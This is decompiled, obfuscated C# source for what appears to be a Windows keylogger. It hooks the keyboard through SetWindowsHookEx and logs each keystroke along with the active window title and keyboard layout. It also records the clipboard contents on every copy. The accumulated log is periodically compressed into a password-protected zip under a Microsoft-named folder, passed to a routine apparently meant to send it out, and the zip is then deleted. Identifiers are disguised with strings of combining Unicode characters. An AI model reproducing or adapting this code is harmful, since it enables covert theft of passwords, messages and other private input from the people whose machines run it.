using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Ionic.Zip;
using Ionic.Zlib;

namespace \u030E\u0360\u0313\u034E\u0315\u0E47\u0020\u0305\u035C\u0351\u0E47\u0351\u0320\u0301\u036B\u0300zcryfxllszuahcty\u0347\u0334\u0342\u0E47\u0310\u032C\u0358\u0340\u036B\u0331\u0329\u036B\u0340\u032F\u0308\u0E47cexuwlosbhsreyjl
{
	// Token: 0x0200000C RID: 12
	internal class Class_8
	{
		// Token: 0x0600001F RID: 31 RVA: 0x0000311C File Offset: 0x0000131C
		[STAThread]
		public static void xmethod_11()
		{
			if (File.Exists(Class_8.field_10))
			{
				Class_8.field_8 = int.Parse(File.ReadAllText(Class_8.field_10));
			}
			Class_8.field_5 = Class_8.tmethod_12(Class_8.field_4);
			Class_8.field_9 = Class_8.kmethod_27().ToString();
			Class_8.vmethod_15(Class_8.kmethod_17("Keyboard layout: " + Class_8.field_9 + "\n", "Key"));
			Application.Run();
			try
			{
				Class_8.smethod_20(Class_8.field_5);
			}
			catch
			{
			}
		}

		// Token: 0x06000020 RID: 32 RVA: 0x000031C8 File Offset: 0x000013C8
		private static IntPtr tmethod_12(Class_8.NClass_0 arg_0)
		{
			IntPtr result;
			using (Process currentProcess = Process.GetCurrentProcess())
			{
				using (ProcessModule mainModule = currentProcess.MainModule)
				{
					result = Class_8.pmethod_19(13, arg_0, Class_8.tmethod_22((mainModule != null) ? mainModule.ModuleName : null), 0U);
				}
			}
			return result;
		}

		// Token: 0x06000021 RID: 33 RVA: 0x0000324C File Offset: 0x0000144C
		private static IntPtr gmethod_13(int sayıInt_0, IntPtr arg_0, IntPtr arg_1)
		{
			if (sayıInt_0 >= 0)
			{
				int num = Marshal.ReadInt32(arg_1);
				string str_ = new KeysConverter().ConvertToString((Keys)num);
				string text = Class_8.kmethod_27().ToString();
				if (!(Class_8.field_9 == text))
				{
					Class_8.vmethod_15(Class_8.kmethod_17("\n<Keyboard layout changed:" + text + ">\n", "Key"));
					Class_8.field_9 = text;
				}
				if (arg_0 == (IntPtr)256)
				{
					Class_8.vmethod_15(Class_8.kmethod_17(str_, "Key"));
				}
				if (arg_0 == (IntPtr)257)
				{
					if (162 == num)
					{
						Class_8.vmethod_15(Class_8.kmethod_17(str_, "Key"));
					}
					if (160 == num)
					{
						Class_8.vmethod_15(Class_8.kmethod_17(str_, "Key"));
					}
				}
				if (67 == num && Keys.Control == Control.ModifierKeys)
				{
					string str = Class_8.cmethod_14();
					Class_8.vmethod_15(Class_8.kmethod_17(Environment.NewLine + " Clipboard changed: " + str + "\n", "Key"));
					Class_8.vmethod_15(Class_8.kmethod_17("\n<COPY>\n", "Key"));
				}
				else if (86 == num && Keys.Control == Control.ModifierKeys)
				{
					Class_8.vmethod_15(Class_8.kmethod_17("\n<PASTE>\n", "Key"));
				}
				else if (90 == num && Keys.Control == Control.ModifierKeys)
				{
					Class_8.vmethod_15(Class_8.kmethod_17("\n<Cancel>\n", "Key"));
				}
				else if (70 == num && Keys.Control == Control.ModifierKeys)
				{
					Class_8.vmethod_15(Class_8.kmethod_17("\n<Find>\n", "Key"));
				}
				else if (65 == num && Keys.Control == Control.ModifierKeys)
				{
					Class_8.vmethod_15(Class_8.kmethod_17("\n<Select all>\n", "Key"));
				}
				else if (78 == num && Keys.Control == Control.ModifierKeys)
				{
					Class_8.vmethod_15(Class_8.kmethod_17("\n<New>\n", "Key"));
				}
				else if (84 == num && Keys.Control == Control.ModifierKeys)
				{
					Class_8.vmethod_15(Class_8.kmethod_17("\n<New tab>\n", "Key"));
				}
				else if (88 == num && Keys.Control == Control.ModifierKeys)
				{
					Class_8.vmethod_15(Class_8.kmethod_17("\n<Cut out>\n", "Key"));
				}
			}
			return Class_8.xmethod_21(Class_8.field_5, sayıInt_0, arg_0, arg_1);
		}

		// Token: 0x06000022 RID: 34 RVA: 0x000034EB File Offset: 0x000016EB
		public static string cmethod_14()
		{
			return Class_23.GetText();
		}

		// Token: 0x06000023 RID: 35 RVA: 0x00003500 File Offset: 0x00001700
		public static void vmethod_15(string str_0)
		{
			if (Class_8.field_3 == Class_8.lmethod_18())
			{
				Class_8.field_6 += str_0;
				Class_8.field_7++;
			}
			else
			{
				Class_8.field_6 += Environment.NewLine;
				Class_8.field_6 = string.Concat(new string[]
				{
					Class_8.field_6,
					"###  ",
					Class_8.lmethod_18(),
					" ###",
					Environment.NewLine
				});
				Class_8.field_6 += str_0;
				Class_8.field_7++;
			}
			if (Class_8.field_7 >= Class_84.\u0329\u0329\u0345\u036C\u034A\u035F\u0325\u0342\u0355\u0356\u0342\u0317\u0320\u035F\u0314\u032Eyvwgmirbhfbfufpn\u0353\u032D\u034B\u0349\u032F\u0318\u036D\u0345\u031D\u0020\u0369\u0489\u0353\u0326\u0309\u0349mfumirlrrwkxuppe)
			{
				Class_8.field_8++;
				File.WriteAllText(Class_8.field_10, Class_8.field_8.ToString());
				Class_8.field_7 = 0;
				try
				{
					Class_8.NClass_1 nclass_ = new Class_8.NClass_1();
					Class_8.NClass_1 nclass_2 = nclass_;
					Task[] array = new Task[1];
					array[0] = new Task(new Action(Class_8.NClass_2.field_3.nmethod_8));
					nclass_2.field_2 = array;
					new Thread(new ThreadStart(nclass_.nmethod_5)).Start();
					Task.WaitAll(nclass_.field_2);
				}
				catch
				{
				}
			}
		}

		// Token: 0x06000024 RID: 36 RVA: 0x00003664 File Offset: 0x00001864
		public static void dmethod_16()
		{
			using (Class_168 class_ = new Class_168(Encoding.GetEncoding("cp866")))
			{
				class_.prop_34 = -1L;
				class_.prop_17 = Class_169.Always;
				class_.prop_9 = Class_202.BestCompression;
				class_.prop_27 = Class_84.\u031D\u036F\u035C\u0345\u0363\u036F\u035C\u036D\u0325\u0343\u034C\u034A\u030D\u0323\u0020\u033Cozrlltgxsptyshzx\u032A\u0343\u0359\u035A\u0323\u0E47\u0340\u0313\u0328\u0351\u0349\u0320t\u0E47\u0331\u032Fyopertjvrnpgnfxb;
				class_.vmethod_775("Keylog" + Class_8.field_8.ToString() + ".txt", Encoding.UTF8.GetBytes(Class_8.field_6));
				Class_8.field_6 = "";
				class_.smethod_930(Class_47.\u030A\u0330\u0314\u0E47\u036D\u0020\u0331\u036B\u0310\u0341\u0353\u0333\u035F\u0368\u0333\u0369fscvyixozutspogr\u0316\u0020\u0E47\u0340\u0020\u0325\u035A\u0342\u032F\u0366\u0303\u036D\u0344\u0302\u0338\u032Cmiwjanndutheeold + "\\Microsoft\\Log" + Class_8.field_8.ToString() + ".zip");
			}
			Class_82.vmethod_245(Class_47.\u030A\u0330\u0314\u0E47\u036D\u0020\u0331\u036B\u0310\u0341\u0353\u0333\u035F\u0368\u0333\u0369fscvyixozutspogr\u0316\u0020\u0E47\u0340\u0020\u0325\u035A\u0342\u032F\u0366\u0303\u036D\u0344\u0302\u0338\u032Cmiwjanndutheeold + "\\Microsoft\\Log" + Class_8.field_8.ToString() + ".zip", "k");
			try
			{
				File.Delete(Class_47.\u030A\u0330\u0314\u0E47\u036D\u0020\u0331\u036B\u0310\u0341\u0353\u0333\u035F\u0368\u0333\u0369fscvyixozutspogr\u0316\u0020\u0E47\u0340\u0020\u0325\u035A\u0342\u032F\u0366\u0303\u036D\u0344\u0302\u0338\u032Cmiwjanndutheeold + "\\Microsoft\\Log" + Class_8.field_8.ToString() + ".zip");
			}
			catch
			{
			}
		}

		// Token: 0x06000025 RID: 37 RVA: 0x00003790 File Offset: 0x00001990
		public static string kmethod_17(string str_0, string str_1)
		{
			if (string.IsNullOrEmpty(str_0))
			{
				return "";
			}
			return str_0;
		}

		// Token: 0x06000026 RID: 38 RVA: 0x000037B0 File Offset: 0x000019B0
		private static string lmethod_18()
		{
			string result;
			try
			{
				uint processId;
				Class_8.dmethod_26(Class_8.cmethod_24(), out processId);
				Process processById = Process.GetProcessById((int)processId);
				string text = processById.MainWindowTitle;
				if (string.IsNullOrWhiteSpace(text))
				{
					text = processById.ProcessName;
				}
				Class_8.field_3 = text;
				result = text;
			}
			catch (Exception)
			{
				result = "???";
			}
			return result;
		}

		// Token: 0x06000027 RID: 39
		[DllImport("user32.dll", CharSet = CharSet.Auto, EntryPoint = "SetWindowsHookEx", SetLastError = true)]
		private static extern IntPtr pmethod_19(int sayıInt_0, Class_8.NClass_0 arg_0, IntPtr arg_1, uint arg_2);

		// Token: 0x06000028 RID: 40
		[DllImport("user32.dll", CharSet = CharSet.Auto, EntryPoint = "UnhookWindowsHookEx", SetLastError = true)]
		[return: MarshalAs(UnmanagedType.Bool)]
		private static extern bool smethod_20(IntPtr arg_0);

		// Token: 0x06000029 RID: 41
		[DllImport("user32.dll", CharSet = CharSet.Auto, EntryPoint = "CallNextHookEx", SetLastError = true)]
		private static extern IntPtr xmethod_21(IntPtr arg_0, int sayıInt_0, IntPtr arg_1, IntPtr arg_2);

		// Token: 0x0600002A RID: 42
		[DllImport("kernel32.dll", CharSet = CharSet.Auto, EntryPoint = "GetModuleHandle", SetLastError = true)]
		private static extern IntPtr tmethod_22(string str_0);

		// Token: 0x0600002B RID: 43
		[DllImport("user32.dll", EntryPoint = "GetWindowThreadProcessId", SetLastError = true)]
		private static extern int gmethod_23([In] IntPtr arg_0, [Out] [Optional] IntPtr arg_1);

		// Token: 0x0600002C RID: 44
		[DllImport("user32.dll", EntryPoint = "GetForegroundWindow", SetLastError = true)]
		private static extern IntPtr cmethod_24();

		// Token: 0x0600002D RID: 45
		[DllImport("user32.dll", EntryPoint = "GetKeyboardLayout", SetLastError = true)]
		private static extern ushort vmethod_25([In] int sayıInt_0);

		// Token: 0x0600002E RID: 46
		[DllImport("user32.dll", EntryPoint = "GetWindowThreadProcessId", SetLastError = true)]
		private static extern uint dmethod_26(IntPtr arg_0, out uint arg_1);

		// Token: 0x0600002F RID: 47 RVA: 0x00003820 File Offset: 0x00001A20
		private static ushort kmethod_27()
		{
			return Class_8.vmethod_25(Class_8.gmethod_23(Class_8.cmethod_24(), IntPtr.Zero));
		}

		// Token: 0x04000026 RID: 38
		private const int field_0 = 13;

		// Token: 0x04000027 RID: 39
		private const int field_1 = 256;

		// Token: 0x04000028 RID: 40
		private const int field_2 = 257;

		// Token: 0x04000029 RID: 41
		private static string field_3;

		// Token: 0x0400002A RID: 42
		private static Class_8.NClass_0 field_4 = new Class_8.NClass_0(Class_8.gmethod_13);

		// Token: 0x0400002B RID: 43
		private static IntPtr field_5 = IntPtr.Zero;

		// Token: 0x0400002C RID: 44
		public static string field_6;

		// Token: 0x0400002D RID: 45
		public static int field_7;

		// Token: 0x0400002E RID: 46
		public static int field_8;

		// Token: 0x0400002F RID: 47
		public static string field_9;

		// Token: 0x04000030 RID: 48
		public static string field_10 = Class_47.\u0349\u0308t\u0324\u0329\u0306\u033Ae\u0340\u0341\u036B\u0351\u0E47c\u0363\u0363xrkhflctjjgrafhq\u036A\u0E47\u0302\u0368\u0020\u032C\u035E\u0349\u0359\u0020\u0020\u0489\u0333\u030C\u0347\u032Cdfodarkersxinukm + "\\KL.txt";

		// Token: 0x0200000D RID: 13
		private delegate NClass_0();

		// Token: 0x0200000E RID: 14
		[CompilerGenerated]
		private sealed class NClass_1
		{
			// Token: 0x06000036 RID: 54 RVA: 0x0000237C File Offset: 0x0000057C
			public void nmethod_4()
			{
				base..ctor();
			}

			// Token: 0x06000037 RID: 55 RVA: 0x00003868 File Offset: 0x00001A68
			internal void nmethod_5()
			{
				Task[] array = this.field_2;
				for (int i = 0; i < array.Length; i++)
				{
					array[i].Start();
				}
			}

			// Token: 0x04000031 RID: 49
			public Task[] field_2;
		}

		// Token: 0x0200000F RID: 15
		[CompilerGenerated]
		[Serializable]
		private sealed class NClass_2
		{
			// Token: 0x06000038 RID: 56 RVA: 0x00003899 File Offset: 0x00001A99
			private static void nmethod_6()
			{
				Class_8.NClass_2.field_3 = new Class_8.NClass_2();
			}

			// Token: 0x06000039 RID: 57 RVA: 0x0000237C File Offset: 0x0000057C
			public void nmethod_7()
			{
				base..ctor();
			}

			// Token: 0x0600003A RID: 58 RVA: 0x000038A5 File Offset: 0x00001AA5
			internal void nmethod_8()
			{
				Class_8.dmethod_16();
			}

			// Token: 0x04000032 RID: 50
			public static readonly Class_8.NClass_2 field_3;

			// Token: 0x04000033 RID: 51
			public static Action field_4;
		}
	}
}
